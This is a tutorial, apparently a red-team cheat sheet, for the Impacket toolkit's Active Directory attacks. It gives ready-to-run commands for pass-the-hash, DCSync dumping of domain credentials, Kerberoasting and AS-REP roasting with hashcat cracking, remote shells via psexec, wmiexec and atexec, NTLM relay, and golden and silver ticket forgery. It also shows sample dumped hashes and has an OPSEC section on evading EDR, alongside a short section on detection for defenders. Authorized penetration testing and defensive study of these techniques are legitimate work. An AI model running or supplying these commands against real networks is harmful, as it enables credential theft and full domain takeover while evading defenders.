# Impacket — full tutorial

Impacket is a collection of Python classes implementing every Windows network protocol from the bottom up: SMB, MSRPC, DCERPC, Kerberos, LDAP, NetBIOS, MS-RRP, MS-DRSR, etc. Most red-team Windows tools (`nxc`, `bloodhound-python`, `coercer`) use it under the hood. The included scripts are the canonical AD attack toolkit.

## Install

```terminal
pipx install impacket
# or
git clone https://github.com/fortra/impacket && cd impacket && pip install .
```

## The scripts you actually use

| Script | Purpose |
|--------|---------|
| `psexec.py` | PsExec-style remote shell via SMB + service create |
| `smbexec.py` | Variant — services without dropping a binary |
| `wmiexec.py` | Remote exec via DCOM/WMI (no service create) |
| `atexec.py` | Remote exec via scheduled task |
| `secretsdump.py` | Dump SAM, LSA, NTDS.dit (DCSync) |
| `GetUserSPNs.py` | Kerberoast |
| `GetNPUsers.py` | AS-REP roast |
| `GetADUsers.py` | Enumerate domain users via LDAP |
| `lookupsid.py` | Resolve SIDs to names |
| `addcomputer.py` | Add a computer (MachineAccountQuota abuse) |
| `rpcdump.py` | Enumerate RPC interfaces |
| `samrdump.py` | SAM enumeration |
| `ntlmrelayx.py` | The NTLM relay server |
| `ticketer.py` | Forge silver/golden Kerberos tickets |
| `ticketConverter.py` | Convert kirbi ↔ ccache |
| `getTGT.py` / `getST.py` | Request TGT or service ticket |
| `Responder` | Not Impacket itself — pairs with ntlmrelayx |
| `mssqlclient.py` | Auth & query MSSQL |
| `dcomexec.py` | DCOM-based exec |

## Universal credential syntax

```
[domain/]username[:password]@target.com[/path]
```

Pass-the-hash:

```terminal
secretsdump.py -hashes :5e5a04...   corp.local/alice@dc01
```

Pass-the-ticket (using ccache):

```terminal
export KRB5CCNAME=alice.ccache
psexec.py -k -no-pass corp.local/alice@dc01.corp.local
```

## Workflows

### secretsdump.py — dump everything dumpable

```terminal
# Local SAM + LSA + cached creds (need local admin / SYSTEM)
secretsdump.py -hashes :5e5a... administrator@10.0.0.5

# DCSync — dump entire domain (needs DRSUAPI / Domain Admin / specific delegations)
secretsdump.py corp.local/admin@dc01.corp.local
secretsdump.py -just-dc corp.local/admin@dc01.corp.local
secretsdump.py -just-dc-user krbtgt corp.local/admin@dc01.corp.local

# From an offline NTDS dump:
secretsdump.py -system SYSTEM -ntds NTDS.dit LOCAL
```

### GetUserSPNs.py — Kerberoast

```terminal
GetUserSPNs.py -request -dc-ip 10.0.0.1 corp.local/alice:'Pass1' -outputfile spns.txt
hashcat -m 13100 spns.txt rockyou.txt
```

### GetNPUsers.py — AS-REP roast (no auth!)

```terminal
GetNPUsers.py corp.local/ -dc-ip 10.0.0.1 -usersfile users.txt -no-pass -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt
```

### psexec.py / wmiexec.py / atexec.py — remote shell

```terminal
psexec.py corp.local/alice:'Pass1'@10.0.0.5
wmiexec.py corp.local/alice:'Pass1'@10.0.0.5
atexec.py corp.local/alice:'Pass1'@10.0.0.5 'whoami /all'
```

`wmiexec` is **stealthier** than `psexec` (no service creation). `atexec` is even quieter (just a scheduled task) but slower.

### ntlmrelayx.py — relay listener

```terminal
ntlmrelayx.py -t smb://10.0.0.5 -smb2support
ntlmrelayx.py -t ldap://dc01 --escalate-user alice
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController
```

Pair with PetitPotam / coercer to force a victim to authenticate to your relay.

### ticketer.py — forge tickets

```terminal
# Golden ticket from krbtgt hash
ticketer.py -nthash <krbtgt-NT> -domain-sid S-1-5-21-... -domain corp.local Administrator

# Silver ticket against a single service
ticketer.py -nthash <svc-NT> -domain-sid S-1-5-21-... -domain corp.local -spn cifs/fileserver alice
```

### addcomputer.py — abuse MachineAccountQuota

```terminal
addcomputer.py -computer-name 'PWN$' -computer-pass 'Pwn1234!' \
  -dc-ip 10.0.0.1 corp.local/alice:'Pass1'
```

By default any domain user can join 10 computers — usable for resource-based constrained delegation attacks.

## Good output

`secretsdump.py` ends with:

```
[*] Cleaning up...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e5a04...
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:abc123...
corp.local\svc_sql:1234:aad3b435b51404eeaad3b435b51404ee:f00ba1...
```

Hashes copy-pasted into hashcat or used directly with PtH.

## Bad output and fixes

| Symptom | Cause | Fix |
|---------|-------|-----|
| `STATUS_ACCESS_DENIED` on `secretsdump --just-dc` | Not enough rights for DRSUAPI | User needs `Replicate Directory Changes` (BUILTIN\Domain Controllers, Domain Admins, Administrators) |
| `KDC_ERR_PREAUTH_FAILED` | Wrong password / clock skew | `ntpdate dc01.corp.local`; verify password with `nxc` first |
| `NetrShareEnum failed` | SMB signing required, anon disallowed | Use creds; cleartext over SMB blocked |
| `psexec.py` stuck waiting | EDR killed the service binary | Try `wmiexec` or `atexec`; or sign your own binary |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | Wrong target hostname / SPN | Use FQDN, ensure Kerberos can resolve it |
| Random `[*] Failed to bind to ...` | DCERPC port blocked | Switch transport: `-target-ip` to ensure routable, or different DC |

## Defender's perspective

`psexec.py` and friends create well-known event signatures:

- 4624 type 3 (network logon).
- 7045 (service installed) for `psexec` — random 8-char service name.
- 4697 / 4698 (scheduled task created) for `atexec`.
- 5145 (network share access) — TEMP files written.
- DCSync triggers 4662 with specific GUIDs (`DS-Replication-Get-Changes-All`).

Detection ideas:

- Microsoft Defender for Identity has built-in DCSync alert.
- Sigma rules for psexec/wmiexec service-name patterns.
- Tier-0 monitoring: any auth from a Tier-1/2 host to a DC outside expected paths.

## OPSEC

- All scripts are Python; their network signatures are well-known. Modern EDR catches default service names.
- Use Kerberos (`-k`) instead of NTLM where possible — looks more native.
- Carry your own kerberos ccache; don't rely on Windows credential cache.
- For DCSync, source from a host that has natural reason to talk LDAP/RPC to a DC.
- Wrap exec channels with rotated random service names by patching the script (the field is exposed via `--service-name` on some).

## Related tools

| Tool | Difference |
|------|-----------|
| **NetExec (nxc)** | High-level wrapper around Impacket |
| **Rubeus** | C# Kerberos toolkit (Windows-side) |
| **Mimikatz** | Local LSASS / credential extraction |
| **Certipy** | AD CS-specific |
| **bloodhound-python** | Imports as module, uses Impacket internally |
